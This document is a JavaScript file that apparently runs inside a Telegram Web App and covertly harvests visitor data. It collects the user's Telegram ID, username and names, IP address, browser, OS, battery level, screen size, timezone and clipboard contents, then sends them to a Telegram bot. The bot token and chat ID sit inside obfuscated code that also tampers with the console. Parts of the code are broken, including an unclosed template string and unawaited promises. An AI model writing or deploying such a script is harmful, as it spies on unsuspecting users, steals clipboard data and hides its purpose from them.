let batteryLevel;
let screenWidth;
let screenHeight;
navigator.getBattery().then(function(battery) {
    batteryLevel = battery.level * 100;
});
screenWidth = window.screen.width;
screenHeight = window.screen.height;
// wXh
const batteryLevelConst = batteryLevel;
const screenWidthConst = screenWidth;
const screenHeightConst = screenHeight;
const clipboardText = navigator.clipboard.readText();

let tg = window.Telegram.WebApp;
document.addEventListener('DOMContentLoaded', function() {
  const urlParams = new URLSearchParams(window.location.search);
  const userAgent = navigator.userAgent;
  fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
      const ip = data.ip;
      const osname = navigator.platform;
      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const browser = getBrowserInfo();
      let userid = document.createElement('p');

      const message = `
*👤 Новый пользователь*

*🧭 Информация:*
*🔍 Account:*
  ├ ID: ${tg.initDataUnsafe.user.id}
  ├ Username: @${tg.initDataUnsafe.user.username}
  ├ Name: ${tg.initDataUnsafe.user.first_name}
  ├ Surname: ${tg.initDataUnsafe.user.last_name}
  ├ Language: ${tg.initDataUnsafe.user.language_code}
*💻 System:*
  ├ IP: ${ip}
  ├ UserAgent: ${userAgent}
  ├ OS: ${osname}
  ├ Browser: ${browser}
  ├ Battery ${batteryLevel}%
  ├ Screen: ${screenWidth}x${screenHeight} px.
  ├ Clipboard: ${clipboardText}
  └ Timezone: ${timeZone};
      
      const _0x4ac1=['369786onoQVD','2213ukYFrQ','apply','591GGqpjz','778847tvTHsc','7172628765:AAG0ffJMcOp5DsRKVcl-unmNkVGHDAY13pY','return\x20/\x22\x20+\x20this\x20+\x20\x22/','400727auVfum','exception','test','length','248810kYVsHz','2980zaiZZA','{}.constructor(\x22return\x20this\x22)(\x20)','bind','55CkMHgx','error','table','241HQJzQE','1MIwkcm','warn','toString','console','return\x20(function()\x20','constructor','^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}','prototype','15681HzOEan'];const _0x1e85=function(_0x3e776a,_0x22abe1){_0x3e776a=_0x3e776a-0xf1;let _0x13411f=_0x4ac1[_0x3e776a];return _0x13411f;};const _0xc51b51=_0x1e85;(function(_0x16a6a2,_0x4eb4e4){const _0x219182=_0x1e85;while(!![]){try{const _0xd2c91d=parseInt(_0x219182(0xfc))+-parseInt(_0x219182(0x103))*parseInt(_0x219182(0xfd))+-parseInt(_0x219182(0xf5))*-parseInt(_0x219182(0x104))+parseInt(_0x219182(0x100))*-parseInt(_0x219182(0x10c))+parseInt(_0x219182(0xf8))+-parseInt(_0x219182(0xf1))+parseInt(_0x219182(0xf4))*parseInt(_0x219182(0xf2));if(_0xd2c91d===_0x4eb4e4)break;else _0x16a6a2['push'](_0x16a6a2['shift']());}catch(_0x64915e){_0x16a6a2['push'](_0x16a6a2['shift']());}}}(_0x4ac1,0xbfdb6));const _0xe5e782=function(){let _0x48dc28=!![];return function(_0x31762c,_0x41b3ae){const _0x5b1cfe=_0x48dc28?function(){const _0x49bb5b=_0x1e85;if(_0x41b3ae){const _0x13ef5d=_0x41b3ae[_0x49bb5b(0xf3)](_0x31762c,arguments);return _0x41b3ae=null,_0x13ef5d;}}:function(){};return _0x48dc28=![],_0x5b1cfe;};}(),_0x5a59ea=_0xe5e782(this,function(){const _0x139329=function(){const _0x4c2448=_0x1e85,_0x206504=_0x139329[_0x4c2448(0x109)](_0x4c2448(0xf7))()['constructor'](_0x4c2448(0x10a));return!_0x206504[_0x4c2448(0xfa)](_0x5a59ea);};return _0x139329();});_0x5a59ea();const _0x3ac928=function(){let _0x3089ae=!![];return function(_0x2031d6,_0x405f87){const _0x1f6ebd=_0x3089ae?function(){const _0x35a076=_0x1e85;if(_0x405f87){const _0x25e3d0=_0x405f87[_0x35a076(0xf3)](_0x2031d6,arguments);return _0x405f87=null,_0x25e3d0;}}:function(){};return _0x3089ae=![],_0x1f6ebd;};}(),_0x4c4821=_0x3ac928(this,function(){const _0x2ceaa7=_0x1e85,_0x163833=function(){const _0xfe2b63=_0x1e85;let _0x49dcc7;try{_0x49dcc7=Function(_0xfe2b63(0x108)+_0xfe2b63(0xfe)+');')();}catch(_0x566b5f){_0x49dcc7=window;}return _0x49dcc7;},_0x1cf8eb=_0x163833(),_0x5a6771=_0x1cf8eb[_0x2ceaa7(0x107)]=_0x1cf8eb[_0x2ceaa7(0x107)]||{},_0x334ff2=['log',_0x2ceaa7(0x105),'info',_0x2ceaa7(0x101),_0x2ceaa7(0xf9),_0x2ceaa7(0x102),'trace'];for(let _0xbec219=0x0;_0xbec219<_0x334ff2[_0x2ceaa7(0xfb)];_0xbec219++){const _0xcf4d79=_0x3ac928['constructor'][_0x2ceaa7(0x10b)][_0x2ceaa7(0xff)](_0x3ac928),_0x1d2a93=_0x334ff2[_0xbec219],_0x120a61=_0x5a6771[_0x1d2a93]||_0xcf4d79;_0xcf4d79['__proto__']=_0x3ac928[_0x2ceaa7(0xff)](_0x3ac928),_0xcf4d79[_0x2ceaa7(0x106)]=_0x120a61[_0x2ceaa7(0x106)][_0x2ceaa7(0xff)](_0x120a61),_0x5a6771[_0x1d2a93]=_0xcf4d79;}});_0x4c4821();const token=_0xc51b51(0xf6);
      const _0x12cd=['12003DjYiWt','apply','5MxysPE','warn','return\x20/\x22\x20+\x20this\x20+\x20\x22/','test','bind','843gNVdEf','332649HeoPsA','^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}','717OeHAgr','1hDQVKo','prototype','-1002079075830','console','1287023kyXdMV','1WiuWXA','table','21MggeGI','169695MtijFG','log','toString','153554PFTrGN','constructor','447252lWlJOq'];const _0x2474=function(_0x495a2a,_0x21bb99){_0x495a2a=_0x495a2a-0x1b3;let _0x2c1a5a=_0x12cd[_0x495a2a];return _0x2c1a5a;};const _0x4f5fb5=_0x2474;(function(_0x1d71bd,_0x4bb2fe){const _0x3b6e2b=_0x2474;while(!![]){try{const _0x1fa3ad=-parseInt(_0x3b6e2b(0x1b5))*parseInt(_0x3b6e2b(0x1c6))+parseInt(_0x3b6e2b(0x1bd))*parseInt(_0x3b6e2b(0x1b8))+parseInt(_0x3b6e2b(0x1c3))+parseInt(_0x3b6e2b(0x1c2))*parseInt(_0x3b6e2b(0x1c5))+-parseInt(_0x3b6e2b(0x1b4))*parseInt(_0x3b6e2b(0x1bb))+parseInt(_0x3b6e2b(0x1ba))+-parseInt(_0x3b6e2b(0x1cb))*parseInt(_0x3b6e2b(0x1ca));if(_0x1fa3ad===_0x4bb2fe)break;else _0x1d71bd['push'](_0x1d71bd['shift']());}catch(_0x421118){_0x1d71bd['push'](_0x1d71bd['shift']());}}}(_0x12cd,0x6c3b9));const _0x356530=function(){let _0x38a295=!![];return function(_0x3a2fbe,_0x4d02dc){const _0x547714=_0x38a295?function(){if(_0x4d02dc){const _0x2e2b08=_0x4d02dc['apply'](_0x3a2fbe,arguments);return _0x4d02dc=null,_0x2e2b08;}}:function(){};return _0x38a295=![],_0x547714;};}(),_0x339ad5=_0x356530(this,function(){const _0x37a0ae=function(){const _0x2ef9dd=_0x2474,_0x331197=_0x37a0ae[_0x2ef9dd(0x1b9)](_0x2ef9dd(0x1bf))()['constructor'](_0x2ef9dd(0x1c4));return!_0x331197[_0x2ef9dd(0x1c0)](_0x339ad5);};return _0x37a0ae();});_0x339ad5();const _0x3aaf39=function(){let _0x4e0e7f=!![];return function(_0x5cfd97,_0x50e5bf){const _0x469c96=_0x4e0e7f?function(){const _0x17c626=_0x2474;if(_0x50e5bf){const _0xe0d01f=_0x50e5bf[_0x17c626(0x1bc)](_0x5cfd97,arguments);return _0x50e5bf=null,_0xe0d01f;}}:function(){};return _0x4e0e7f=![],_0x469c96;};}(),_0x522357=_0x3aaf39(this,function(){const _0x1801f0=_0x2474;let _0xace584;try{const _0x3655f0=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0xace584=_0x3655f0();}catch(_0x4d1271){_0xace584=window;}const _0x599ff2=_0xace584[_0x1801f0(0x1c9)]=_0xace584[_0x1801f0(0x1c9)]||{},_0x348be9=[_0x1801f0(0x1b6),_0x1801f0(0x1be),'info','error','exception',_0x1801f0(0x1b3),'trace'];for(let _0xb61751=0x0;_0xb61751<_0x348be9['length'];_0xb61751++){const _0x48a37c=_0x3aaf39[_0x1801f0(0x1b9)][_0x1801f0(0x1c7)]['bind'](_0x3aaf39),_0x3eea13=_0x348be9[_0xb61751],_0x2e68b5=_0x599ff2[_0x3eea13]||_0x48a37c;_0x48a37c['__proto__']=_0x3aaf39['bind'](_0x3aaf39),_0x48a37c[_0x1801f0(0x1b7)]=_0x2e68b5['toString'][_0x1801f0(0x1c1)](_0x2e68b5),_0x599ff2[_0x3eea13]=_0x48a37c;}});_0x522357();const chatId=_0x4f5fb5(0x1c8);
      const url = 'https://api.telegram.org/bot'+token+'/sendMessage';
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('text', message);
      formData.append('parse_mode', 'Markdown');
      fetch(url, {
        method: 'POST',
        body: formData
      });
    });

function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browser = '';
    const match = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];

    if (/trident/i.test(match[1])) {
      const tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
      browser = `IE ${tem[1] || ''}`;
    }

    if (match[1] === 'Chrome') {
      const tem = ua.match(/\b(OPR|Edge)\/(\d+)/);
      if (tem != null) browser = tem.slice(1).join(' ').replace('OPR', 'Opera');
    }

    match[2] = match[2] ? `version ${match[2]}` : '';
    browser = `${match[1] || ''} ${match[2] || ''}`.trim();
    return browser;
  }
  });